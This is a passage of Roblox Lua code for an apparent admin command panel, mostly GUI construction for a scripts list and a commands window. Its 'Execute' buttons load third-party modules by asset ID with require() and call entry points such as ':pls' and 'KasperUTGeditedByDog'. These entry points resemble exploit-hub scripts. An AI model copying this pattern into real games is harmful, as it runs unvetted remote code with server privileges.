			["_TextBox"] = Instance.new("TextBox");
			["_Seperator"] = Instance.new("Frame");
			["_Ubar"] = Instance.new("Frame");
			["_TextLabel3"] = Instance.new("TextLabel");
			["_UICorner4"] = Instance.new("UICorner");
			["_TextBox1"] = Instance.new("TextBox");
			["_Seperator2"] = Instance.new("Frame");
			["_LocalScript"] = Instance.new("LocalScript");
			["_Configuration"] = Instance.new("Configuration");
			["_Value"] = Instance.new("StringValue");
		}

		-- Properties:

		ScriptsUI["_ScriptsUi"].Name = "ScriptsUi"
		ScriptsUI["_ScriptsUi"].Parent = sender:WaitForChild("PlayerGui")

		ScriptsUI["_Frame"].BackgroundColor3 = Color3.fromRGB(30.00000011175871, 30.00000011175871, 30.00000011175871)
		ScriptsUI["_Frame"].BorderSizePixel = 0
		ScriptsUI["_Frame"].ClipsDescendants = true
		ScriptsUI["_Frame"].Position = UDim2.new(0.5, -225, 0.5, -200)
		ScriptsUI["_Frame"].Size = UDim2.new(0, 450, 0, 400)
		ScriptsUI["_Frame"].Parent = ScriptsUI["_ScriptsUi"]

		ScriptsUI["_ScrollingFrame"].CanvasSize = UDim2.new(0, 0, 0, 530)
		ScriptsUI["_ScrollingFrame"].ScrollBarImageColor3 = Color3.fromRGB(100.00000163912773, 100.00000163912773, 100.00000163912773)
		ScriptsUI["_ScrollingFrame"].ScrollBarThickness = 2
		ScriptsUI["_ScrollingFrame"].BackgroundTransparency = 1
		ScriptsUI["_ScrollingFrame"].BorderSizePixel = 0
		ScriptsUI["_ScrollingFrame"].Position = UDim2.new(0, 5, 0, 81)
		ScriptsUI["_ScrollingFrame"].Size = UDim2.new(1, -10, 0.820000052, -50)
		ScriptsUI["_ScrollingFrame"].Parent = ScriptsUI["_Frame"]

		ScriptsUI["_UIListLayout"].Padding = UDim.new(0, 8)
		ScriptsUI["_UIListLayout"].Parent = ScriptsUI["_ScrollingFrame"]

		for scrpt, data in pairs(Internals.Scripts) do

			ScriptsUI["_Frame"].Name = scrpt


			local scriptbuttonUI = {
				["_Frame1"] = Instance.new("Frame"),
				["_TextLabel"] = Instance.new("TextLabel"),
				["_UICorner"] = Instance.new("UICorner"),
				["_TextButton"] = Instance.new("TextButton"),
				["_UICorner1"] = Instance.new("UICorner")
			}

			scriptbuttonUI["_Frame1"].BackgroundColor3 = Color3.fromRGB(35, 35, 35)
			scriptbuttonUI["_Frame1"].BackgroundTransparency = 0.4
			scriptbuttonUI["_Frame1"].BorderSizePixel = 0
			scriptbuttonUI["_Frame1"].Position = UDim2.new(0, 0, 0, 14)
			scriptbuttonUI["_Frame1"].Size = UDim2.new(1, -10, 0, 40)
			scriptbuttonUI["_Frame1"].Parent = ScriptsUI["_ScrollingFrame"]

			scriptbuttonUI["_TextLabel"].Font = Enum.Font.Gotham
			scriptbuttonUI["_TextLabel"].Text = scrpt
			scriptbuttonUI["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptbuttonUI["_TextLabel"].TextSize = 16
			scriptbuttonUI["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
			scriptbuttonUI["_TextLabel"].BackgroundTransparency = 1
			scriptbuttonUI["_TextLabel"].Position = UDim2.new(0, 10, 0, 0)
			scriptbuttonUI["_TextLabel"].Size = UDim2.new(0.6, 0, 1, 0)
			scriptbuttonUI["_TextLabel"].Parent = scriptbuttonUI["_Frame1"]

			scriptbuttonUI["_UICorner"].CornerRadius = UDim.new(0, 4)
			scriptbuttonUI["_UICorner"].Parent = scriptbuttonUI["_Frame1"]

			scriptbuttonUI["_TextButton"].Font = Enum.Font.Unknown
			scriptbuttonUI["_TextButton"].Text = "Execute"
			scriptbuttonUI["_TextButton"].TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptbuttonUI["_TextButton"].TextScaled = true
			scriptbuttonUI["_TextButton"].TextSize = 41
			scriptbuttonUI["_TextButton"].TextWrapped = true
			scriptbuttonUI["_TextButton"].BackgroundColor3 = Color3.fromRGB(40, 40, 40)
			scriptbuttonUI["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptbuttonUI["_TextButton"].BorderSizePixel = 0
			scriptbuttonUI["_TextButton"].Position = UDim2.new(0.886, 0, 0.25, 0)
			scriptbuttonUI["_TextButton"].Size = UDim2.new(0, 38, 0, 19)
			scriptbuttonUI["_TextButton"].Parent = scriptbuttonUI["_Frame1"]

			scriptbuttonUI["_TextButton"].MouseButton1Click:Connect(function()
				local moduleId = tonumber(data.ID)
				if moduleId then
					local module = require(moduleId)
					if data.Module == ":pls" then
						module:pls(sender.Name)
					elseif data.Module == ".KasperUTGeditedByDog" then
						module.KasperUTGeditedByDog(sender.Name)
					end
				end
			end)
			scriptbuttonUI["_UICorner1"].Parent = scriptbuttonUI["_TextButton"]
		end

		ScriptsUI["_UICorner2"].CornerRadius = UDim.new(0, 4)
		ScriptsUI["_UICorner2"].Parent = ScriptsUI["_Frame"]

		ScriptsUI["_ImageButton"].Image = "http://www.roblox.com/asset/?id=15112972490"
		ScriptsUI["_ImageButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScriptsUI["_ImageButton"].BackgroundTransparency = 1
		ScriptsUI["_ImageButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScriptsUI["_ImageButton"].BorderSizePixel = 4
		ScriptsUI["_ImageButton"].Position = UDim2.new(0.91871208, 0, 0.0183650404, 0)
		ScriptsUI["_ImageButton"].Size = UDim2.new(0, 25, 0, 25)
		ScriptsUI["_ImageButton"].Parent = ScriptsUI["_Frame"]

		ScriptsUI["_ImageButton"].MouseButton1Click:Connect(function()
			ScriptsUI._Frame:TweenPosition(UDim2.new(0.5, -225, 1.5, -200), "Out", "Quad", 0.5, true)
			task.wait(0.5)
			ScriptsUI["_ScriptsUi"]:Destroy()
		end)


		ScriptsUI["_TextLabel1"].Font = Enum.Font.GothamBold
		ScriptsUI["_TextLabel1"].Text = "Scripts List"
		ScriptsUI["_TextLabel1"].TextColor3 = Color3.fromRGB(255, 255, 255)
		ScriptsUI["_TextLabel1"].TextSize = 20
		ScriptsUI["_TextLabel1"].TextXAlignment = Enum.TextXAlignment.Left
		ScriptsUI["_TextLabel1"].BackgroundTransparency = 1
		ScriptsUI["_TextLabel1"].Position = UDim2.new(0, 36, 0, 0)
		ScriptsUI["_TextLabel1"].Size = UDim2.new(0.942222238, -10, 0.0950000063, 0)
		ScriptsUI["_TextLabel1"].Parent = ScriptsUI["_Frame"]

		ScriptsUI["_ImageLabel"].Image = "rbxassetid://118863969287785"
		ScriptsUI["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScriptsUI["_ImageLabel"].BackgroundTransparency = 1
		ScriptsUI["_ImageLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScriptsUI["_ImageLabel"].BorderSizePixel = 0
		ScriptsUI["_ImageLabel"].Position = UDim2.new(0.010562134, 0, 0.0173077006, 0)
		ScriptsUI["_ImageLabel"].Size = UDim2.new(0.0555555709, 0, 0.0640384704, 0)
		ScriptsUI["_ImageLabel"].Parent = ScriptsUI["_Frame"]


		ScriptsUI["_Seperator"].BackgroundColor3 = Color3.fromRGB(40.00000141561031, 40.00000141561031, 40.00000141561031)
		ScriptsUI["_Seperator"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScriptsUI["_Seperator"].BorderSizePixel = 0
		ScriptsUI["_Seperator"].Position = UDim2.new(0, 0, 0.200000003, 0)
		ScriptsUI["_Seperator"].Size = UDim2.new(1, 0, 0, 2)
		ScriptsUI["_Seperator"].Name = "Seperator"
		ScriptsUI["_Seperator"].Parent = ScriptsUI["_Frame"]


		ScriptsUI["_Seperator2"].BackgroundColor3 = Color3.fromRGB(40.00000141561031, 40.00000141561031, 40.00000141561031)
		ScriptsUI["_Seperator2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScriptsUI["_Seperator2"].BorderSizePixel = 0
		ScriptsUI["_Seperator2"].Position = UDim2.new(-0.00222222228, 0, 0.894999981, 0)
		ScriptsUI["_Seperator2"].Size = UDim2.new(1, 0, 0, 2)
		ScriptsUI["_Seperator2"].Name = "Seperator2"
		ScriptsUI["_Seperator2"].Parent = ScriptsUI["_Frame"]
	end
})

addcmd({
	Name = "cmds",
	Aliases = {"commands"},
	Function = function(sender, targets, arguments)
		table.sort(Internals.Commands, function(A, B)
			return A
		end)
		local G2L = {};

			G2L["1"] = Instance.new("ScreenGui", sender:WaitForChild("PlayerGui"));
			G2L["1"]["Name"] = [[Commands]];
			G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

			G2L["2"] = Instance.new("Frame", G2L["1"]);
			G2L["2"]["BorderSizePixel"] = 0;
			G2L["2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
			G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["2"]["Size"] = UDim2.new(0.25512, 0, 0.0201, 0);
			G2L["2"]["Position"] = UDim2.new(0.47762, 0, 0.34749, 0);
			G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["2"]["Name"] = [[TopBar]];
			
			local Dragger = Instance.new("UIDragDetector", G2L["2"])

			G2L["3"] = Instance.new("Frame", G2L["2"]);
			G2L["3"]["BorderSizePixel"] = 0;
			G2L["3"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
			G2L["3"]["Size"] = UDim2.new(1, 0, 19.99997, 0);
			G2L["3"]["Position"] = UDim2.new(0, 0, 1, 0);
			G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["3"]["Name"] = [[MFrame]];
			G2L["3"]["BackgroundTransparency"] = 0.1;

			G2L["4"] = Instance.new("Frame", G2L["3"]);
			G2L["4"]["BorderSizePixel"] = 0;
			G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["4"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["4"]["Name"] = [[Tabs]];
			G2L["4"]["BackgroundTransparency"] = 1;

			G2L["5"] = Instance.new("TextButton", G2L["4"]);
			G2L["5"]["TextWrapped"] = true;
			G2L["5"]["BorderSizePixel"] = 0;
			G2L["5"]["TextSize"] = 14;
			G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["5"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
			G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["5"]["Size"] = UDim2.new(0.33364, 0, 0.0625, 0);
			G2L["5"]["Name"] = [[Playerlist]];
			G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["5"]["Text"] = [[]];

			G2L["6"] = Instance.new("TextLabel", G2L["5"]);
			G2L["6"]["TextWrapped"] = true;
			G2L["6"]["BorderSizePixel"] = 0;
			G2L["6"]["TextScaled"] = true;
			G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["6"]["TextSize"] = 14;
			G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["6"]["BackgroundTransparency"] = 1;
			G2L["6"]["Size"] = UDim2.new(1, 0, 0.7, 0);
			G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["6"]["Text"] = [[PlayerList]];
			G2L["6"]["Position"] = UDim2.new(0, 0, 0.15, 0);

			G2L["7"] = Instance.new("TextButton", G2L["4"]);
			G2L["7"]["TextWrapped"] = true;
			G2L["7"]["BorderSizePixel"] = 0;
			G2L["7"]["TextSize"] = 14;
			G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["7"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
			G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["7"]["Size"] = UDim2.new(0.33, 0, 0.0625, 0);
			G2L["7"]["Name"] = [[Commands]];
			G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["7"]["Text"] = [[]];
			G2L["7"]["Position"] = UDim2.new(0.33364, 0, 0, 0);

			G2L["8"] = Instance.new("TextLabel", G2L["7"]);
			G2L["8"]["TextWrapped"] = true;
			G2L["8"]["BorderSizePixel"] = 0;
			G2L["8"]["TextScaled"] = true;
			G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["8"]["TextSize"] = 14;
			G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["8"]["BackgroundTransparency"] = 1;
			G2L["8"]["Size"] = UDim2.new(1, 0, 0.7, 0);
			G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["8"]["Text"] = [[Commands]];
			G2L["8"]["Position"] = UDim2.new(0, 0, 0.15, 0);

			G2L["9"] = Instance.new("TextButton", G2L["4"]);
			G2L["9"]["TextWrapped"] = true;
			G2L["9"]["BorderSizePixel"] = 0;
			G2L["9"]["TextSize"] = 14;
			G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["9"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
			G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["9"]["Size"] = UDim2.new(0.33611, 0, 0.0625, 0);
			G2L["9"]["Name"] = [[Logs]];
			G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["9"]["Text"] = [[]];
			G2L["9"]["Position"] = UDim2.new(0.66364, 0, 0, 0);

			G2L["a"] = Instance.new("TextLabel", G2L["9"]);
			G2L["a"]["TextWrapped"] = true;
			G2L["a"]["BorderSizePixel"] = 0;
			G2L["a"]["TextScaled"] = true;
			G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["a"]["TextSize"] = 14;
			G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["a"]["BackgroundTransparency"] = 1;
			G2L["a"]["Size"] = UDim2.new(1, 0, 0.7, 0);
			G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["a"]["Text"] = [[Logs]];
			G2L["a"]["Position"] = UDim2.new(0, 0, 0.15, 0);

			G2L["b"] = Instance.new("Frame", G2L["3"]);
			G2L["b"]["BorderSizePixel"] = 0;
			G2L["b"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
			G2L["b"]["Size"] = UDim2.new(0.94408, 0, 0.8875, 0);
			G2L["b"]["Position"] = UDim2.new(0.02549, 0, 0.0875, 0);
			G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["b"]["Name"] = [[TabPages]];
			G2L["b"]["BackgroundTransparency"] = 0.2;

			G2L["c"] = Instance.new("Frame", G2L["b"]);
			G2L["c"]["Visible"] = false;
			G2L["c"]["BorderSizePixel"] = 0;
			G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["c"]["Name"] = [[Logs]];
			G2L["c"]["BackgroundTransparency"] = 1;

			G2L["d"] = Instance.new("ScrollingFrame", G2L["c"]);
			G2L["d"]["ZIndex"] = 4;
			G2L["d"]["BorderSizePixel"] = 0;
			G2L["d"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
			G2L["d"]["TopImage"] = [[rbxassetid://2569109007]];
			G2L["d"]["MidImage"] = [[rbxassetid://2569109007]];
			G2L["d"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
			G2L["d"]["Name"] = [[logsFrame]];
			G2L["d"]["BottomImage"] = [[rbxassetid://2569109007]];
			G2L["d"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
			G2L["d"]["ScrollBarThickness"] = 8;
			G2L["d"]["BackgroundTransparency"] = 1;

			G2L["e"] = Instance.new("Frame", G2L["b"]);
			G2L["e"]["BorderSizePixel"] = 0;
			G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["e"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["e"]["Name"] = [[Commands]];
			G2L["e"]["BackgroundTransparency"] = 1;

			G2L["f"] = Instance.new("ScrollingFrame", G2L["e"]);
			G2L["f"]["ZIndex"] = 4;
			G2L["f"]["BorderSizePixel"] = 0;
			G2L["f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
			G2L["f"]["TopImage"] = [[rbxassetid://2569109007]];
			G2L["f"]["MidImage"] = [[rbxassetid://2569109007]];
			G2L["f"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
			G2L["f"]["Name"] = [[CommandsFrame]];
			G2L["f"]["BottomImage"] = [[rbxassetid://2569109007]];
			G2L["f"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
			G2L["f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
			G2L["f"]["ScrollBarThickness"] = 8;
			G2L["f"]["BackgroundTransparency"] = 1;

			G2L["10"] = Instance.new("UIListLayout", G2L["f"]);
			G2L["10"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
			G2L["10"]["Padding"] = UDim.new(0, 2);
			G2L["10"]["SortOrder"] = Enum.SortOrder.Name;

			G2L["11"] = Instance.new("Frame", G2L["f"]);
			G2L["11"]["BorderSizePixel"] = 0;
			G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["11"]["Size"] = UDim2.new(0, 0, 0, 7);
			G2L["11"]["Position"] = UDim2.new(0.06545, 0, 0, 0);
			G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["11"]["Name"] = [[Seperator]];
			G2L["11"]["BackgroundTransparency"] = 1;

			G2L["12"] = Instance.new("Frame", G2L["b"]);
			G2L["12"]["Visible"] = false;
			G2L["12"]["BorderSizePixel"] = 0;
			G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["12"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["12"]["Name"] = [[Players]];
			G2L["12"]["BackgroundTransparency"] = 1;

			G2L["13"] = Instance.new("ScrollingFrame", G2L["12"]);
			G2L["13"]["ZIndex"] = 4;
			G2L["13"]["BorderSizePixel"] = 0;
			G2L["13"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
			G2L["13"]["TopImage"] = [[rbxassetid://2569109007]];
			G2L["13"]["MidImage"] = [[rbxassetid://2569109007]];
			G2L["13"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
			G2L["13"]["Name"] = [[PlayerListFrame]];
			G2L["13"]["BottomImage"] = [[rbxassetid://2569109007]];
			G2L["13"]["Size"] = UDim2.new(1, 0, 1, 0);
			G2L["13"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
			G2L["13"]["ScrollBarThickness"] = 8;
			G2L["13"]["BackgroundTransparency"] = 1;

			G2L["14"] = Instance.new("UIListLayout", G2L["13"]);
			G2L["14"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
			G2L["14"]["Padding"] = UDim.new(0, 2);
			G2L["14"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

			G2L["15"] = Instance.new("Frame", G2L["13"]);
			G2L["15"]["BorderSizePixel"] = 0;
			G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["15"]["Size"] = UDim2.new(0, 0, 0, 7);
			G2L["15"]["Position"] = UDim2.new(0.06545, 0, 0, 0);
			G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["15"]["Name"] = [[Seperator]];
			G2L["15"]["BackgroundTransparency"] = 1;

			G2L["16"] = Instance.new("Frame", G2L["b"]);
			G2L["16"]["BorderSizePixel"] = 0;
			G2L["16"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
			G2L["16"]["Size"] = UDim2.new(1, 0, 0, 0);
			G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["16"]["Name"] = [[Transition]];

			G2L["17"] = Instance.new("TextButton", G2L["2"]);
			G2L["17"]["BorderSizePixel"] = 0;
			G2L["17"]["TextSize"] = 14;
			G2L["17"]["TextColor3"] = Color3.fromRGB(68, 0, 0);
			G2L["17"]["BackgroundColor3"] = Color3.fromRGB(68, 0, 0);
			G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["17"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["17"]["Size"] = UDim2.new(0.036, 0, 0.9, 0);
			G2L["17"]["Name"] = [[Close]];
			G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["17"]["Text"] = [[]];
			G2L["17"]["Position"] = UDim2.new(0.981, 0, 0.5, 0);

			G2L["18"] = Instance.new("TextButton", G2L["2"]);
			G2L["18"]["BorderSizePixel"] = 0;
			G2L["18"]["TextSize"] = 14;
			G2L["18"]["TextColor3"] = Color3.fromRGB(68, 0, 0);
			G2L["18"]["BackgroundColor3"] = Color3.fromRGB(68, 68, 68);
			G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["18"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
			G2L["18"]["Size"] = UDim2.new(0.036, 0, 0.9, 0);
			G2L["18"]["Name"] = [[Minimize]];
			G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["18"]["Text"] = [[]];
			G2L["18"]["Position"] = UDim2.new(0.944, 0, 0.499, 0);

			G2L["19"] = Instance.new("TextButton", G2L["2"]);
			G2L["19"]["TextWrapped"] = true;
			G2L["19"]["BorderSizePixel"] = 0;
			G2L["19"]["TextSize"] = 14;
			G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["19"]["TextScaled"] = true;
			G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["19"]["AnchorPoint"] = Vector2.new(0.5, 0);
			G2L["19"]["Size"] = UDim2.new(0.246, 0, 0.8745, 0);
			G2L["19"]["BackgroundTransparency"] = 1;
			G2L["19"]["Name"] = [[Uame]];
			G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["19"]["Text"] = [[Name]];
			G2L["19"]["Position"] = UDim2.new(0.5, 0, 0.0625, 0);

			G2L["1a"] = Instance.new("Frame", G2L["19"]);
			G2L["1a"]["Visible"] = false;
			G2L["1a"]["ZIndex"] = 2;
			G2L["1a"]["BorderSizePixel"] = 0;
			G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
			G2L["1a"]["Size"] = UDim2.new(0, 100, 0, 72);
			G2L["1a"]["Position"] = UDim2.new(-0.01753, 0, -5.64608, 0);
			G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["1a"]["Name"] = [[UserFrame]];
			G2L["1a"]["BackgroundTransparency"] = 1;

			G2L["1b"] = Instance.new("TextLabel", G2L["1a"]);
			G2L["1b"]["TextWrapped"] = true;
			G2L["1b"]["BorderSizePixel"] = 0;
			G2L["1b"]["TextScaled"] = true;
			G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1b"]["TextSize"] = 14;
			G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1b"]["BackgroundTransparency"] = 1;
			G2L["1b"]["Size"] = UDim2.new(0.78, 0, 0.19147, 0);
			G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["1b"]["Text"] = [[Logs]];
			G2L["1b"]["Name"] = [[Display]];
			G2L["1b"]["Position"] = UDim2.new(0.11, 0, 0.12673, 0);

			G2L["1c"] = Instance.new("TextLabel", G2L["1a"]);
			G2L["1c"]["TextWrapped"] = true;
			G2L["1c"]["BorderSizePixel"] = 0;
			G2L["1c"]["TextScaled"] = true;
			G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1c"]["TextSize"] = 14;
			G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1c"]["BackgroundTransparency"] = 1;
			G2L["1c"]["Size"] = UDim2.new(0.78, 0, 0.19147, 0);
			G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["1c"]["Text"] = [[Logs]];
			G2L["1c"]["Name"] = [[name]];
			G2L["1c"]["Position"] = UDim2.new(0.11, 0, 0.3058, 0);

			G2L["1d"] = Instance.new("TextLabel", G2L["1a"]);
			G2L["1d"]["TextWrapped"] = true;
			G2L["1d"]["BorderSizePixel"] = 0;
			G2L["1d"]["TextScaled"] = true;
			G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1d"]["TextSize"] = 14;
			G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1d"]["BackgroundTransparency"] = 1;
			G2L["1d"]["Size"] = UDim2.new(0.78, 0, 0.19147, 0);
			G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["1d"]["Text"] = [[Logs]];
			G2L["1d"]["Name"] = [[UId]];
			G2L["1d"]["Position"] = UDim2.new(0.11, 0, 0.48487, 0);

			G2L["1e"] = Instance.new("TextLabel", G2L["1a"]);
			G2L["1e"]["TextWrapped"] = true;
			G2L["1e"]["BorderSizePixel"] = 0;
			G2L["1e"]["TextScaled"] = true;
			G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1e"]["TextSize"] = 14;
			G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["1e"]["BackgroundTransparency"] = 1;
			G2L["1e"]["Size"] = UDim2.new(0.78, 0, 0.19147, 0);
			G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["1e"]["Text"] = [[Logs]];
			G2L["1e"]["Name"] = [[Age]];
			G2L["1e"]["Position"] = UDim2.new(0.11, 0, 0.66394, 0);

			G2L["1f"] = Instance.new("LocalScript", G2L["1"]);
			G2L["1f"]["Name"] = [[Handler]];

			G2L["20"] = Instance.new("Frame", G2L["1f"]);
			G2L["20"]["BorderSizePixel"] = 0;
			G2L["20"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
			G2L["20"]["Size"] = UDim2.new(0.95, 0, 0, 18);
			G2L["20"]["Position"] = UDim2.new(0.01832, 0, 0.03169, 0);
			G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["20"]["Name"] = [[CmdTemplate]];
			G2L["20"]["BackgroundTransparency"] = 0.6;

			G2L["21"] = Instance.new("TextLabel", G2L["20"]);
			G2L["21"]["BorderSizePixel"] = 0;
			G2L["21"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["21"]["TextSize"] = 14;
			G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["21"]["BackgroundTransparency"] = 1;
			G2L["21"]["Size"] = UDim2.new(0.38107, 0, 1, 0);
			G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["21"]["Text"] = [[CmdTemplate]];
			G2L["21"]["Name"] = [[Command]];
			G2L["21"]["Position"] = UDim2.new(0.02989, 0, 0, 0);

			G2L["22"] = Instance.new("TextLabel", G2L["20"]);
			G2L["22"]["BorderSizePixel"] = 0;
			G2L["22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["22"]["TextSize"] = 14;
			G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
